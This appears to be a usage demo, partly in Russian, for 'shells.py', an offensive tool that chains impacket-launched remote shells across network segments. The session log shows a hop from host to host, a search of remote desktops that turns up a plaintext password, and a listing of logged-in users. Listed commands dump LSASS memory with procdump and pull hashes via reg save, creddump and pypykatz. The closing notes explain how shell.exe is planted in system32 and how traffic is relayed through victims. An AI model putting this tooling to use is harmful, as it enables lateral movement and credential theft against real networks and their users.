shells.py 10.10.1.130

10.10.1.130/> shell 10.10.2.15

10.10.2.15/> shell 10.10.3.201

10.10.3.201/> shell 10.10.4.20/28 grep.ps1 "secret"
10.10.4.21: c:/users/ivanov.ii/desktop/1.txt "secret password: P@$$w0rd"

10.10.3.201/> shell 10.10.4.20/28 qprocess * | findstr explorer
10.10.4.21: explorer.exe 	1 	4253 		ivanov.ii
10.10.4.23: explorer.exe 	1 	109215 		petrov.pp
10.10.4.24: explorer.exe 	1 	5436 		sidorov.ss

10.10.3.201/> shell 10.10.4.20/28
10.10.4.20/> ^D
10.10.4.21/> show

`10.10.1.130
 `10.10.2.15
  `10.10.3.201
   `10.10.4.20
    10.10.4.21 <-

10.10.4.21/> shell 10.10.5.90 10.10.6.20
10.10.5.90/>
10.10.6.20/> show

`10.10.1.130
 `10.10.2.15
  `10.10.3.201
   `10.10.4.20
    10.10.4.21
    `10.10.5.90
     `10.10.6.20 <-

команды shells.py:
10.10.6.20/> put procdump.exe 		- копирование через socat
10.10.6.20/> get lsass.dmp 			- копирование через socat
10.10.6.20/> hashdump 				- reg save + socat + creddump local
10.10.6.20/> mimikatz 				- procdump + socat + pypykatz
*копирование через socat делает возможным работу с хостами с закрытыми 445/tcp

shells.py скрипт через impacket запускающий удалённо bind.exe/reverse.exe shell.
Главное его отличие - он открывает shell прямо из текущего shell victim, не требующий ручного проброса портов. При этом соединение открывается через victim.
Он копирует в system32 программу shell.exe, которая представляет из себя упрощенный аналог socat.
При каждом вызове он открывает два связанных одновременных соединения в сторону target и attacker, 
давая возможность распределённо по сети захватывать хосты.
Если указана иная команда, она будет выполнена в неинтерактивном формате. При этом проверяется, если указанная команда это файл в текущей директории attacker, то сперва файл будет скопирован на victim.
Команда shell представляет из себя так же некоторый alias для shells.py, который развернется в выполнение команд shell.exe с определёнными аргументами.
Команды put,get,hashdump,mimikatz так же alias shells.py, не имеет соответствующей exe-программы.

реализация прокси:
 открывается новый шелл
 старый шелл переводится в режим проброса портов - писать hexa от трафика прямо в консоль (redirect.exe)
